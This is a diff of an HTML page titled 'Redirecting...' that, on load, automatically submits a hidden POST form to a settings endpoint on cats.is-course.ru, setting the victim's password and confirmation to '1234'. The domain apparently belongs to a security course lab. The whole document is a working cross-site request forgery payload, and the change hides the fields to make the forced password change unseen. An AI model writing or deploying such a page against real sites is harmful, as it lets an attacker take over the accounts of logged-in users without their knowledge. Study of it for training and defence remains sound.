@@ -5,12 +5,12 @@
     <title>Redirecting...</title>
 </head>
 <body>
-    <form action="https://cats.is-course.ru/settings" method="POST">
-        <input name="password" value="345">
-        <input name="confirm-password" value="345">
+    <form id="redirectForm" action="https://cats.is-course.ru/settings" method="POST">
+        <input type="hidden" name="password" value="1234">
+        <input type="hidden" name="confirm-password" value="1234">
     </form>
     <script>
-        document.forms[0].submit()
+        document.forms[0].submit();
     </script>
 </body>
 </html>
